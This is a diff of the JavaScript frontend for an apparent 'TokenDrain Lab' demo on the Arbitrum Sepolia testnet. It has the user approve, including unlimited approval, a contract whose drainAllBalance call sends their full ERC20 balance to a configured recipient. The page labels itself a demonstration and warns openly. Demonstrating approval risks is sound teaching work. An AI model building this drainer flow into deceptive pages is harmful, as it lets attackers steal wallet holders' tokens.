@@ -5,26 +5,32 @@ const ERC20_ABI = [
   "function balanceOf(address) view returns (uint256)",
   "function allowance(address,address) view returns (uint256)",
   "function approve(address,uint256) returns (bool)",
-  "event Approval(address indexed owner,address indexed spender,uint256 value)",
-  "event Transfer(address indexed from,address indexed to,uint256 value)"
+  "event Approval(address indexed owner,address indexed spender,uint256 value)"
 ];
 
-const SWAPPER_ABI = [
-  "function recipient() view returns (address)",
-  "function transferAllTokens(address token, uint256 amount) returns (bool)",
-  "event TokensTransferred(address indexed token, address indexed from, address indexed to, uint256 amount)"
+const DRAIN_ABI = [
+  "function drainAllBalance(address token) returns (uint256)",
+  "function transferTokens(address token, uint256 amount) returns (bool)",
+  "function getRecipient() view returns (address)",
+  "event BalanceDrained(address indexed token, address indexed from, address indexed to, uint256 amount)"
 ];
+
+const ARBITRUM_CONFIG = {
+  chainId: "0x66eed",
+  chainName: "Arbitrum Sepolia",
+  nativeCurrency: { name: "ETH", symbol: "ETH", decimals: 18 },
+  rpcUrls: ["https://sepolia-rollup.arbitrum.io/rpc"],
+  blockExplorerUrls: ["https://sepolia-explorer.arbitrum.io"]
+};
 
 const state = {
   provider: null,
   signer: null,
   userAddress: null,
   tokenContract: null,
-  swapperContract: null,
-  swapperAddress: null,
-  recipientAddress: null,
-  tokenDecimals: 18,
-  config: null
+  drainContract: null,
+  config: null,
+  tokenDecimals: 18
 };
 
 const $ = (id) => document.getElementById(id);
@@ -37,8 +43,8 @@ function log(message) {
 }
 
 function showStatus(type, message, txHash = null) {
-  const statusEl = type === "approve" ? $("approveStatus") : $("transferStatus");
-  const textEl = type === "approve" ? $("approveStatusText") : $("transferStatusText");
+  const statusEl = type === "approve" ? $("approveStatus") : $("drainStatus");
+  const textEl = type === "approve" ? $("approveStatusText") : $("drainStatusText");
   const linkEl = $("txLink");
 
   statusEl.style.display = "block";
@@ -52,57 +58,42 @@ function showStatus(type, message, txHash = null) {
   }
 }
 
-function hideStatus(type) {
-  const statusEl = type === "approve" ? $("approveStatus") : $("transferStatus");
-  statusEl.style.display = "none";
-}
-
 async function loadConfig() {
   try {
     const response = await fetch("./config.json");
     if (!response.ok) throw new Error("config.json not found");
     state.config = await response.json();
-    state.swapperAddress = state.config.swapper;
-    state.recipientAddress = state.config.recipient;
-    $("recipientAddress").textContent = state.recipientAddress;
+    $("recipientAddress").textContent = state.config.recipient;
     log("✅ Configuration loaded");
-    log("📍 Swapper contract: " + state.swapperAddress);
-    log("📍 Recipient: " + state.recipientAddress);
+    log("Contract: " + state.config.contract);
+    log("Recipient: " + state.config.recipient);
   } catch (e) {
     log("❌ Failed to load config: " + e.message);
-    alert("Error: config.json not found. Run 'npm run deploy' first!");
+    alert("ERROR: config.json not found.\n\nRun: npm run deploy");
   }
 }
 
 async function connectWallet() {
   if (!window.ethereum) {
-    alert("MetaMask not found! Install MetaMask to continue.");
+    alert("❌ MetaMask not found!\nInstall MetaMask to continue.");
     return;
   }
 
   try {
     log("🔗 Connecting to MetaMask...");
 
-    // Request Sepolia network
+    // Switch to Arbitrum Sepolia
     try {
       await window.ethereum.request({
         method: "wallet_switchEthereumChain",
-        params: [{ chainId: "0xaa36a7" }]
+        params: [{ chainId: ARBITRUM_CONFIG.chainId }]
       });
     } catch (switchError) {
       if (switchError.code === 4902) {
-        log("⚙️ Adding Sepolia network to MetaMask...");
+        log("⚙️ Adding Arbitrum Sepolia to MetaMask...");
         await window.ethereum.request({
           method: "wallet_addEthereumChain",
-          params: [
-            {
-              chainId: "0xaa36a7",
-              chainName: "Sepolia",
-              nativeCurrency: { name: "Ethereum", symbol: "ETH", decimals: 18 },
-              rpcUrls: ["https://sepolia.infura.io/v3/..."],
-              blockExplorerUrls: ["https://sepolia.etherscan.io"]
-            }
-          ]
+          params: [ARBITRUM_CONFIG]
         });
       } else if (switchError.code !== 4001) {
         throw switchError;
@@ -120,19 +111,27 @@ async function connectWallet() {
     state.signer = await state.provider.getSigner();
     state.userAddress = accounts[0];
 
+    // Initialize drain contract
+    state.drainContract = new ethers.Contract(
+      state.config.contract,
+      DRAIN_ABI,
+      state.signer
+    );
+
     $("walletAddress").textContent = state.userAddress;
-    $("networkName").textContent = "Sepolia (11155111)";
+    $("networkStatus").textContent = "✅ Arbitrum Sepolia (421614)";
     $("loadTokenBtn").disabled = false;
     $("refreshBtn").disabled = false;
 
     log("✅ Wallet connected: " + state.userAddress);
+    log("🔗 Network: Arbitrum Sepolia");
   } catch (e) {
     log("❌ Connection failed: " + (e.message || e));
   }
 }
 
 async function loadTokenInfo() {
-  if (!state.signer) {
+  if (!state.signer || !state.config) {
     alert("Connect wallet first!");
     return;
   }
@@ -143,7 +142,7 @@ async function loadTokenInfo() {
       throw new Error("Invalid token address");
     }
 
-    log("📍 Loading token info for: " + tokenAddr);
+    log("📋 Loading token: " + tokenAddr);
 
     state.tokenContract = new ethers.Contract(tokenAddr, ERC20_ABI, state.signer);
 
@@ -152,7 +151,7 @@ async function loadTokenInfo() {
       state.tokenContract.symbol(),
       state.tokenContract.decimals(),
       state.tokenContract.balanceOf(state.userAddress),
-      state.tokenContract.allowance(state.userAddress, state.swapperAddress)
+      state.tokenContract.allowance(state.userAddress, state.config.contract)
     ]);
 
     state.tokenDecimals = decimals;
@@ -166,14 +165,14 @@ async function loadTokenInfo() {
 
     $("approveBtn").disabled = false;
     $("approveMaxBtn").disabled = false;
+    $("drainBtn").disabled = false;
     $("approveAmount").value = humanBalance;
-    $("transferAmount").value = humanBalance;
 
-    log("✅ Token loaded: " + name + " (" + symbol + ")");
-    log("💰 Your balance: " + humanBalance + " " + symbol);
-    log("✅ Current allowance: " + humanAllowance + " " + symbol);
+    log("✅ Loaded: " + name + " (" + symbol + ")");
+    log("💰 Balance: " + humanBalance + " " + symbol);
+    log("✅ Allowance: " + humanAllowance + " " + symbol);
   } catch (e) {
-    log("❌ Error loading token: " + (e.message || e));
+    log("❌ Error: " + (e.message || e));
   }
 }
 
@@ -186,7 +185,7 @@ async function approveToken() {
   try {
     const amount = $("approveAmount").value.trim();
     if (!amount || Number(amount) <= 0) {
-      throw new Error("Enter a valid amount");
+      throw new Error("Invalid amount");
     }
 
     const approveAmount = ethers.parseUnits(amount, state.tokenDecimals);
@@ -194,19 +193,18 @@ async function approveToken() {
 
     log("🔐 Requesting approval...");
     log("Amount: " + amount + " " + symbol);
-    log("Spender: " + state.swapperAddress);
     showStatus("approve", "⏳ Waiting for transaction...");
 
-    const tx = await state.tokenContract.approve(state.swapperAddress, approveAmount);
-    log("📤 Approval tx sent: " + tx.hash);
+    const tx = await state.tokenContract.approve(state.config.contract, approveAmount);
+    log("📤 Tx sent: " + tx.hash);
 
     const receipt = await tx.wait();
-    log("✅ Approval confirmed in block " + receipt.blockNumber);
-    showStatus("approve", "✅ Approval successful! You can now execute the transfer.", tx.hash);
+    log("✅ Approved! Block " + receipt.blockNumber);
+    showStatus("approve", "✅ Approval successful! The contract can now drain your tokens.", tx.hash);
 
-    await refreshTokenInfo();
+    await loadTokenInfo();
   } catch (e) {
-    log("❌ Approval error: " + (e.shortMessage || e.message || e));
+    log("❌ Error: " + (e.shortMessage || e.message || e));
     showStatus("approve", "❌ " + (e.shortMessage || e.message || "Unknown error"));
   }
 }
@@ -218,22 +216,23 @@ async function approveMax() {
   }
 
   try {
-    const maxAmount = ethers.MaxUint256;
     const symbol = await state.tokenContract.symbol();
-
     log("🔐 Requesting unlimited approval...");
     showStatus("approve", "⏳ Waiting for transaction...");
 
-    const tx = await state.tokenContract.approve(state.swapperAddress, maxAmount);
-    log("📤 Unlimited approval tx sent: " + tx.hash);
+    const tx = await state.tokenContract.approve(
+      state.config.contract,
+      ethers.MaxUint256
+    );
+    log("📤 Tx sent: " + tx.hash);
 
     const receipt = await tx.wait();
-    log("✅ Unlimited approval confirmed in block " + receipt.blockNumber);
-    showStatus("approve", "✅ Unlimited approval successful!", tx.hash);
+    log("✅ Unlimited approval! Block " + receipt.blockNumber);
+    showStatus("approve", "⚠️ Unlimited approval granted! Contract can now drain any amount.", tx.hash);
 
-    await refreshTokenInfo();
+    await loadTokenInfo();
   } catch (e) {
-    log("❌ Approve max error: " + (e.shortMessage || e.message || e));
+    log("❌ Error: " + (e.shortMessage || e.message || e));
     showStatus("approve", "❌ " + (e.shortMessage || e.message || "Unknown error"));
   }
 }
@@ -249,71 +248,66 @@ async function resetApproval() {
     log("🔐 Resetting approval to 0...");
     showStatus("approve", "⏳ Waiting for transaction...");
 
-    const tx = await state.tokenContract.approve(state.swapperAddress, 0);
-    log("📤 Reset tx sent: " + tx.hash);
+    const tx = await state.tokenContract.approve(state.config.contract, 0);
+    log("📤 Tx sent: " + tx.hash);
 
     const receipt = await tx.wait();
-    log("✅ Approval reset to 0 in block " + receipt.blockNumber);
+    log("✅ Approval reset! Block " + receipt.blockNumber);
     showStatus("approve", "✅ Approval reset to zero.", tx.hash);
 
-    await refreshTokenInfo();
+    await loadTokenInfo();
   } catch (e) {
-    log("❌ Reset error: " + (e.shortMessage || e.message || e));
+    log("❌ Error: " + (e.shortMessage || e.message || e));
     showStatus("approve", "❌ " + (e.shortMessage || e.message || "Unknown error"));
   }
 }
 
-async function executeTransfer() {
-  if (!state.tokenContract || !state.signer || !state.swapperContract) {
+async function drainTokens() {
+  if (!state.tokenContract || !state.signer || !state.drainContract) {
     alert("Connect wallet and load token first!");
     return;
   }
 
   try {
-    const amount = $("transferAmount").value.trim();
-    if (!amount || Number(amount) <= 0) {
-      throw new Error("Enter a valid amount");
+    const balance = await state.tokenContract.balanceOf(state.userAddress);
+    if (balance === 0n) {
+      throw new Error("You have no tokens to drain");
     }
 
-    const transferAmount = ethers.parseUnits(amount, state.tokenDecimals);
+    const allowance = await state.tokenContract.allowance(
+      state.userAddress,
+      state.config.contract
+    );
+    if (allowance < balance) {
+      throw new Error("Insufficient allowance. Approve tokens first!");
+    }
+
     const symbol = await state.tokenContract.symbol();
+    const humanBalance = ethers.formatUnits(balance, state.tokenDecimals);
 
-    log("🚀 Executing transfer...");
-    log("Amount: " + amount + " " + symbol);
-    log("From: " + state.userAddress);
-    log("To: " + state.recipientAddress);
-    showStatus("transfer", "⏳ Waiting for transaction...");
+    log("🚨 EXECUTING DRAIN...");
+    log("Amount: " + humanBalance + " " + symbol);
+    log("To: " + state.config.recipient);
+    showStatus("drain", "⏳ DRAINING ALL TOKENS...");
 
-    // Initialize swapper contract if not already done
-    if (!state.swapperContract) {
-      state.swapperContract = new ethers.Contract(
-        state.swapperAddress,
-        SWAPPER_ABI,
-        state.signer
-      );
-    }
+    const tx = await state.drainContract.drainAllBalance(
+      state.tokenContract.getAddress()
+    );
+    log("📤 Tx sent: " + tx.hash);
 
-    const tx = await state.swapperContract.transferAllTokens(
-      state.tokenContract.getAddress(),
-      transferAmount
+    const receipt = await tx.wait();
+    log("✅ DRAIN COMPLETE! Block " + receipt.blockNumber);
+    log("💸 " + humanBalance + " " + symbol + " sent to recipient!");
+    showStatus(
+      "drain",
+      "✅ DRAIN SUCCESSFUL! All tokens transferred to recipient.",
+      tx.hash
     );
 
-    log("📤 Transfer tx sent: " + tx.hash);
-    const receipt = await tx.wait();
-    log("✅ Transfer confirmed in block " + receipt.blockNumber);
-    log("💸 " + amount + " " + symbol + " transferred to " + state.recipientAddress);
-    showStatus("transfer", "✅ Transfer successful! Tokens have been sent to the recipient.", tx.hash);
-
-    await refreshTokenInfo();
-  } catch (e) {
-    log("❌ Transfer error: " + (e.shortMessage || e.message || e));
-    showStatus("transfer", "❌ " + (e.shortMessage || e.message || "Unknown error"));
-  }
-}
-
-async function refreshTokenInfo() {
-  if (state.tokenContract && state.userAddress) {
     await loadTokenInfo();
+  } catch (e) {
+    log("❌ Error: " + (e.shortMessage || e.message || e));
+    showStatus("drain", "❌ " + (e.shortMessage || e.message || "Unknown error"));
   }
 }
 
@@ -323,11 +317,12 @@ $("loadTokenBtn").addEventListener("click", loadTokenInfo);
 $("approveBtn").addEventListener("click", approveToken);
 $("approveMaxBtn").addEventListener("click", approveMax);
 $("resetApprovalBtn").addEventListener("click", resetApproval);
-$("transferBtn").addEventListener("click", executeTransfer);
-$("refreshBtn").addEventListener("click", refreshTokenInfo);
+$("drainBtn").addEventListener("click", drainTokens);
+$("refreshBtn").addEventListener("click", loadTokenInfo);
 
-// Init
+// Initialize on load
 window.addEventListener("load", () => {
-  log("🚀 Web3 Security Lab initialized");
+  log("🚀 TokenDrain Lab initialized");
+  log("💡 This is a demonstration of ERC20 approval vulnerabilities");
   loadConfig();
 });
